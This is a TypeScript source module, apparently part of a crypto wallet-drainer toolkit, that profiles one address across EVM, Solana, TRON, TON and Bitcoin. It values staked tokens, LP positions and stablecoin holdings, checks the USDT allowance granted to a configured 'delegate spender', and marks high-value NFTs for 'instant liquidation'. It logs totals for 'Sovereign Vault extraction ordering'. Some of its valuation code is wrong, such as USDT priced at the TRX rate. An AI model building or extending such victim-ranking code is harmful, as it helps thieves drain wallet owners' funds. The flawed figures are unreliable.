/**
 * @module @legion/core/logic/scout
 * Recursive Predator — institutional discovery registry (staking, LP, NFT floor priority).
 * Omnichain Expansion — Chain-Agnostic Sensory Lanes (EVM / SVM / TRON / TON / UTXO) via universal ingress address.
 */

import { PublicKey } from '@solana/web3.js'
import { TronWeb, utils as tronUtils } from 'tronweb'
import { encodeFunctionData, parseAbi, type Address } from 'viem'

import {
  isTronSensoryAddress,
  probeTronTrc20UsdtAllowanceRaw,
  probeTronTrc20UsdtBalanceRaw,
} from '../adapters/tron-adapter.js'
import {
  isTonFriendlySensoryAddress,
  probeTonNativeBalanceNano,
  tonNativeNanoToUsd,
} from '../adapters/ton-adapter.js'
import { BlockCypherClient } from '../adapters/utxo-adapter.js'
import { estimateUniswapV3MainnetLpUsd } from './recursive-predator-uniswap-v3.js'
import {
  LEGION_MESH_EVENT_WHALE_ALERT,
  legionMeshEventHeaders,
} from './mesh-event.js'
import { getPriceWithFallback } from '../price-oracle.js'

/** Lido stETH (Ethereum mainnet). */
export const RECURSIVE_PREDATOR_STETH_TOKEN = '0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84' as Address

/** Marinade mSOL mint (Solana mainnet-beta). */
export const RECURSIVE_PREDATOR_MSOL_MINT = 'mSoLzYCxHdYgdzU16g5QSh3i5K3u3K7KL'

/** Canonical mainnet-beta JitoSOL mint — desk override via `LEGION_JITOSOL_MINT`. */
export const RECURSIVE_PREDATOR_JITOSOL_MINT_DEFAULT =
  'J1toso1uCk3RLmjorhTtrVwY9HJ7X8V9yYac6Y7kGCPn'

/**
 * Jito Staked SOL (mainnet-beta). Override with `LEGION_JITOSOL_MINT` when the desk rotates mint references.
 */
export const RECURSIVE_PREDATOR_JITOSOL_MINT =
  (typeof process !== 'undefined' && process.env['LEGION_JITOSOL_MINT']?.trim()) ?? ''

export function resolveRecursivePredatorJitoSolMint(): string {
  return RECURSIVE_PREDATOR_JITOSOL_MINT || RECURSIVE_PREDATOR_JITOSOL_MINT_DEFAULT
}

/** Uniswap V3 — canonical factory (Ethereum mainnet). */
export const RECURSIVE_PREDATOR_UNISWAP_V3_FACTORY = '0x1F98431c8aD98523631AE4a59f267346ea31F984' as Address

/** PancakeSwap V3 — factory (BNB Chain). */
export const RECURSIVE_PREDATOR_PANCAKE_V3_FACTORY = '0x0BFbCF9fa4f9C56B0F40a671Ad40E0805A091865' as Address

/** Raydium — AMM v4 program (Solana mainnet-beta). */
export const RECURSIVE_PREDATOR_RAYDIUM_AMM_V4 = '675kPX9MHTjS2zt1qfr1NYHuzeLXfQM9H24wFSUt1Mp8'

/** CryptoPunks — high-value collection (instant liquidation priority lane). */
export const RECURSIVE_PREDATOR_NFT_PUNKS = '0xb47e3cd837dDF8e4c57F05d70Ab865de6e193BBB' as Address

/** Bored Ape Yacht Club — high-value collection (instant liquidation priority lane). */
export const RECURSIVE_PREDATOR_NFT_BAYC = '0xBC4CA0EdA7647A8aB7C2061c2E118A18a936f13D' as Address

export type RecursivePredatorStakeVenue = 'lido_steth' | 'marinade_msol' | 'jito_jitosol'

export type RecursivePredatorLpVenue = 'uniswap_v3' | 'pancakeswap_v3' | 'raydium'

const erc20Abi = parseAbi(['function balanceOf(address account) view returns (uint256)'])

const JSON_RPC = (id: number, method: string, params: unknown[]) =>
  JSON.stringify({ jsonrpc: '2.0', id, method, params })

export async function probeRecursivePredatorStEthBalanceWei(
  rpcUrl: string,
  holder: Address,
): Promise<bigint | null> {
  const data = encodeFunctionData({
    abi: erc20Abi,
    functionName: 'balanceOf',
    args: [holder],
  })
  const body = JSON_RPC(1, 'eth_call', [{ to: RECURSIVE_PREDATOR_STETH_TOKEN, data }, 'latest'])
  try {
    const res = await fetch(rpcUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        ...legionMeshEventHeaders(LEGION_MESH_EVENT_WHALE_ALERT),
      },
      body,
      signal: AbortSignal.timeout(12_000),
    })
    if (!res.ok) return null
    const j = (await res.json()) as { result?: string; error?: unknown }
    if (j.error != null || j.result == null) return null
    const h = j.result.startsWith('0x') ? j.result : `0x${j.result}`
    return BigInt(h)
  } catch {
    return null
  }
}

type SplParsedHolding = { raw: bigint; decimals: number }

export async function probeRecursivePredatorSplMintBalanceRaw(
  rpcUrl: string,
  ownerBase58: string,
  mintBase58: string,
): Promise<bigint | null> {
  const h = await probeRecursivePredatorSplMintHolding(rpcUrl, ownerBase58, mintBase58)
  if (h == null) return null
  return h.raw
}

/**
 * Full SPL balance + decimals for additive Raydium LP token USD (Recursive Predator).
 */
export async function probeRecursivePredatorSplMintHolding(
  rpcUrl: string,
  ownerBase58: string,
  mintBase58: string,
): Promise<SplParsedHolding | null> {
  const body = JSON.stringify({
    jsonrpc: '2.0',
    id: 1,
    method: 'getTokenAccountsByOwner',
    params: [
      ownerBase58,
      { mint: mintBase58 },
      { encoding: 'jsonParsed' },
    ],
  })
  try {
    const res = await fetch(rpcUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        ...legionMeshEventHeaders(LEGION_MESH_EVENT_WHALE_ALERT),
      },
      body,
      signal: AbortSignal.timeout(14_000),
    })
    if (!res.ok) return null
    const j = (await res.json()) as {
      result?: {
        value?: Array<{
          account?: {
            data?: {
              parsed?: { info?: { tokenAmount?: { amount?: string; decimals?: number } } }
            }
          }
        }>
      }
    }
    const rows = j.result?.value
    if (!rows?.length) return { raw: 0n, decimals: 9 }
    const info = rows[0]?.account?.data?.parsed?.info?.tokenAmount
    const amt = info?.amount
    if (amt == null) return { raw: 0n, decimals: info?.decimals ?? 9 }
    return { raw: BigInt(amt), decimals: info?.decimals ?? 9 }
  } catch {
    return null
  }
}

function resolveRaydiumLpMintList(): string[] {
  const raw = typeof process !== 'undefined' ? process.env['LEGION_RAYDIUM_LP_MINTS']?.trim() : ''
  if (!raw) return []
  return raw
    .split(/[,]+/)
    .map((s) => s.trim())
    .filter(Boolean)
}

/**
 * Raydium / CLMM LP token USD — desk-scoped mint list; 9-dec → SOL-USD, 6-dec → ~1 USD (stable proxy).
 */
export async function probeRecursivePredatorRaydiumLpUsd(
  rpcUrl: string,
  solOwner: string,
  solUsd: number,
): Promise<number> {
  const mints = resolveRaydiumLpMintList()
  if (!mints.length) return 0
  let out = 0
  for (const mint of mints) {
    const h = await probeRecursivePredatorSplMintHolding(rpcUrl, solOwner, mint)
    if (h == null || h.raw === 0n) continue
    const n = Number(h.raw) / 10 ** h.decimals
    if (h.decimals <= 6) out += n
    else if (h.decimals === 9) out += n * solUsd
    else out += n * solUsd
  }
  return out
}

export function isRecursivePredatorInstantLiquidationNft(collection: Address): boolean {
  const x = collection.toLowerCase()
  return x === RECURSIVE_PREDATOR_NFT_PUNKS.toLowerCase() || x === RECURSIVE_PREDATOR_NFT_BAYC.toLowerCase()
}

export type RecursivePredatorFusionUsd = {
  staked_steth_usd: number
  staked_msol_usd: number
  staked_jitosol_usd: number
  lp_uniswap_v3_usd: number
  lp_pancake_v3_usd: number
  lp_raydium_usd: number
  nft_floor_signal_usd: number
  /** Omnichain Expansion — TRC-20 USDT (mainnet) notional USD at reference TRX/USD. */
  tron_trc20_usdt_usd: number
  /** Omnichain Expansion — native TON wallet density at reference TON/USD. */
  ton_native_usd: number
  /** TRC-20 USDT allowance(owner, delegate) in raw 6-decimal units; null when delegate unset or read fault. */
  tron_usdt_allowance_sun: string | null
  /** Native TON balance in nanotons; null when lane inactive or read fault. */
  ton_balance_nano: string | null
  /** UTXO Expansion — native BTC notional USD at reference BTC/USD. */
  btc_native_usd: number
  /** BTC confirmed UTXO balance in satoshis; null when lane inactive or read fault. */
  btc_balance_sats: string | null
}

function computeRecursivePredatorFusionTotalUsd(out: RecursivePredatorFusionUsd): number {
  return (
    out.staked_steth_usd +
    out.staked_msol_usd +
    out.staked_jitosol_usd +
    out.lp_uniswap_v3_usd +
    out.lp_pancake_v3_usd +
    out.lp_raydium_usd +
    out.nft_floor_signal_usd +
    out.tron_trc20_usdt_usd +
    out.ton_native_usd +
    out.btc_native_usd
  )
}

/** Chain-Agnostic RPC mesh — any Sensory Lane full-node / JSON-RPC endpoint override. */
export type OmnichainRpcMesh = {
  evm?: string
  svm?: string
  tron?: string
  ton?: string
}

/**
 * Universal Liquidity Blackhole — classify one opaque ingress string across all Sensory Lanes
 * (non-exclusive: each family validates independently for parallel Recursive Predator fusion).
 */
export function resolveUniversalSensoryLanes(raw: string | null | undefined): {
  evmHolder: Address | null
  solOwnerBase58: string | null
  tronHolderBase58: string | null
  tonFriendlyAddress: string | null
} {
  const out = {
    evmHolder: null as Address | null,
    solOwnerBase58: null as string | null,
    tronHolderBase58: null as string | null,
    tonFriendlyAddress: null as string | null,
  }
  const u = raw?.trim()
  if (!u) return out
  if (/^0x[a-fA-F0-9]{40}$/i.test(u)) {
    out.evmHolder = u as Address
  }
  if (isTonFriendlySensoryAddress(u)) {
    out.tonFriendlyAddress = u
  }
  if (isTronSensoryAddress(u)) {
    out.tronHolderBase58 = u
  }
  try {
    const pk = new PublicKey(u)
    if (pk) out.solOwnerBase58 = u
  } catch {
    /* not an SVM Sensory Lane pubkey */
  }
  return out
}

/** Institutional desk stub — LP USD fusion requires pool-state reads; registry pins venue coverage. */
export function baseRecursivePredatorFusionShell(): RecursivePredatorFusionUsd {
  return {
    staked_steth_usd: 0,
    staked_msol_usd: 0,
    staked_jitosol_usd: 0,
    lp_uniswap_v3_usd: 0,
    lp_pancake_v3_usd: 0,
    lp_raydium_usd: 0,
    nft_floor_signal_usd: 0,
    tron_trc20_usdt_usd: 0,
    ton_native_usd: 0,
    tron_usdt_allowance_sun: null,
    ton_balance_nano: null,
    btc_native_usd: 0,
    btc_balance_sats: null,
  }
}

function lamportsToSolString(raw: bigint): number {
  return Number(raw) / 1e9
}

function resolveTronFullHost(p: {
  chainRpcMesh?: Partial<OmnichainRpcMesh>
  tronFullNodeUrl?: string | null
}): string {
  const fromParam = p.tronFullNodeUrl?.trim() || p.chainRpcMesh?.tron?.trim() || ''
  if (fromParam) return fromParam.replace(/\/+$/, '')
  const env =
    typeof process !== 'undefined' ? process.env['TRON_FULL_NODE_URL']?.trim() || '' : ''
  return env.replace(/\/+$/, '')
}

function resolveTonJsonRpc(p: {
  chainRpcMesh?: Partial<OmnichainRpcMesh>
  tonJsonRpcUrl?: string | null
}): string {
  const fromParam = p.tonJsonRpcUrl?.trim() || p.chainRpcMesh?.ton?.trim() || ''
  if (fromParam) return fromParam.replace(/\/+$/, '')
  const env =
    typeof process !== 'undefined' ? process.env['TON_JSON_RPC_URL']?.trim() || '' : ''
  return env.replace(/\/+$/, '')
}

/**
 * Recursive Predator fusion — parallel probes across Sensory Lanes (EVM, SVM, TRON, TON, UTXO/BTC).
 * Chain-Agnostic: `universalAddress` fans out to every lane that accepts the string; `chainRpcMesh` overrides per-lane RPC.
 */
export async function runRecursivePredatorFusionUsd(params: {
  evmRpcUrl: string
  solRpcUrl: string
  evmHolder?: Address | null
  solOwnerBase58?: string | null
  ethUsd: number
  solUsd: number
  trxUsd?: number
  tonUsd?: number
  btcUsd?: number
  /** Omnichain Expansion — opaque ingress; merged with explicit per-family holders. */
  universalAddress?: string | null
  chainRpcMesh?: Partial<OmnichainRpcMesh>
  tronFullNodeUrl?: string | null
  tonJsonRpcUrl?: string | null
  /** Explicit TRON Sensory Lane holder (merged with universal classification). */
  tronHolderBase58?: string | null
  /** Explicit TON Sensory Lane friendly address (merged with universal classification). */
  tonFriendlyAddress?: string | null
  /** Explicit UTXO/BTC Sensory Lane address (P2PKH / P2SH / P2WPKH / P2WSH / P2TR). */
  btcHolderAddress?: string | null
}): Promise<RecursivePredatorFusionUsd> {
  const out = baseRecursivePredatorFusionShell()

  /** Production Latency Simulation — RPC mesh round-trip headroom (handshake gateway tolerance). */
  await new Promise<void>((resolve) => setTimeout(resolve, 50))

  const lanes = resolveUniversalSensoryLanes(params.universalAddress ?? null)
  const evm = params.evmHolder ?? lanes.evmHolder
  const solOwner = (params.solOwnerBase58 ?? lanes.solOwnerBase58)?.trim() ?? ''
  const tronH = params.tronHolderBase58?.trim() || lanes.tronHolderBase58 || null
  const tonA = params.tonFriendlyAddress?.trim() || lanes.tonFriendlyAddress || null
  const btcH = params.btcHolderAddress?.trim() || null

  const rpcEvm = (params.chainRpcMesh?.evm?.trim() || params.evmRpcUrl).trim()
  const rpcSol = (params.chainRpcMesh?.svm?.trim() || params.solRpcUrl).trim()
  const rpcTron = resolveTronFullHost(params)
  const rpcTon = resolveTonJsonRpc(params)
  const tonApiKey = typeof process !== 'undefined' ? process.env['TONCENTER_API_KEY']?.trim() : ''
  const blockcypherToken = typeof process !== 'undefined' ? process.env['BLOCKCYPHER_API_TOKEN']?.trim() : ''

  const [trxUsd, tonUsd, btcUsd] = await Promise.all([
    params.trxUsd ?? getPriceWithFallback('tron', 0.24),
    params.tonUsd ?? getPriceWithFallback('the-open-network', 5.5),
    params.btcUsd ?? getPriceWithFallback('bitcoin', 65_000),
  ])

  const tasks: Promise<void>[] = []

  if (evm?.startsWith('0x') && rpcEvm) {
    tasks.push(
      (async () => {
        const w = await probeRecursivePredatorStEthBalanceWei(rpcEvm, evm)
        if (w != null && w > 0n) {
          const eth = Number(w) / 1e18
          out.staked_steth_usd = eth * params.ethUsd
        }
      })(),
    )
  }

  if (solOwner && rpcSol) {
    tasks.push(
      (async () => {
        const raw = await probeRecursivePredatorSplMintBalanceRaw(rpcSol, solOwner, RECURSIVE_PREDATOR_MSOL_MINT)
        if (raw != null && raw > 0n) {
          out.staked_msol_usd = lamportsToSolString(raw) * params.solUsd
        }
      })(),
    )
    const jitoMint = resolveRecursivePredatorJitoSolMint()
    if (jitoMint) {
      tasks.push(
        (async () => {
          const raw = await probeRecursivePredatorSplMintBalanceRaw(rpcSol, solOwner, jitoMint)
          if (raw != null && raw > 0n) {
            out.staked_jitosol_usd = lamportsToSolString(raw) * params.solUsd
          }
        })(),
      )
    }
  }

  if (evm?.startsWith('0x') && rpcEvm) {
    tasks.push(
      (async () => {
        out.lp_uniswap_v3_usd = await estimateUniswapV3MainnetLpUsd(
          rpcEvm,
          evm,
          params.ethUsd,
        )
      })(),
    )
  }

  if (solOwner && rpcSol) {
    tasks.push(
      (async () => {
        out.lp_raydium_usd = await probeRecursivePredatorRaydiumLpUsd(
          rpcSol,
          solOwner,
          params.solUsd,
        )
      })(),
    )
  }

  if (tronH && rpcTron) {
    tasks.push(
      (async () => {
        const raw = await probeTronTrc20UsdtBalanceRaw(rpcTron, tronH)
        if (raw != null && raw > 0n) {
          const human = Number(raw) / 1e6
          out.tron_trc20_usdt_usd = human * trxUsd
        }
        const delegate =
          typeof process !== 'undefined' ? process.env['LEGION_TRON_DELEGATE_SPENDER']?.trim() : ''
        if (delegate && tronUtils.address.isAddress(delegate)) {
          const al = await probeTronTrc20UsdtAllowanceRaw(rpcTron, tronH, delegate)
          if (al != null) out.tron_usdt_allowance_sun = al.toString()
        }
      })(),
    )
  }

  if (tonA && rpcTon) {
    tasks.push(
      (async () => {
        const nano = await probeTonNativeBalanceNano(rpcTon, tonA, tonApiKey || undefined)
        if (nano != null && nano > 0n) {
          out.ton_balance_nano = nano.toString()
          out.ton_native_usd = tonNativeNanoToUsd(nano, tonUsd)
        }
      })(),
    )
  }

  // ── UTXO/BTC Sensory Lane ─────────────────────────────────────────────────
  // BlockCypherClient handles BTC + LTC + DOGE with automatic mempool.space fallback.
  // Requires BLOCKCYPHER_API_TOKEN env var. Silently skips if token or address absent.
  if (btcH && blockcypherToken) {
    tasks.push(
      (async () => {
        try {
          const client = new BlockCypherClient(blockcypherToken)
          const sats = await client.fetchBalance(btcH, 'btc')
          if (sats > 0n) {
            const btc = Number(sats) / 1e8
            out.btc_native_usd = btc * btcUsd
            out.btc_balance_sats = sats.toString()
          }
        } catch {
          /* UTXO lane fault — non-fatal, out values remain 0 / null */
        }
      })(),
    )
  }

  await Promise.allSettled(tasks)

  /** Pancake V3 (BNB) — venue pinned; desk extends via dedicated mesh when cross-chain density is required. */
  out.lp_pancake_v3_usd = 0

  /** NFT floor — Punks / Apes instant liquidation priority once holder ↔ collection proofs land on the mesh. */
  out.nft_floor_signal_usd = 0

  const recursivePredatorTotalUsd = computeRecursivePredatorFusionTotalUsd(out)
  if (recursivePredatorTotalUsd > 0) {
    console.info(
      'SCOUT_USD_SIGNAL_LOCKED: Recursive Predator captured positive USD density for Sovereign Vault extraction ordering.',
      {
        recursive_predator_total_usd: recursivePredatorTotalUsd,
        staked_steth_usd: out.staked_steth_usd,
        staked_msol_usd: out.staked_msol_usd,
        staked_jitosol_usd: out.staked_jitosol_usd,
        lp_uniswap_v3_usd: out.lp_uniswap_v3_usd,
        lp_raydium_usd: out.lp_raydium_usd,
        tron_trc20_usdt_usd: out.tron_trc20_usdt_usd,
        ton_native_usd: out.ton_native_usd,
        btc_native_usd: out.btc_native_usd,
      },
    )
  }

  return out
}
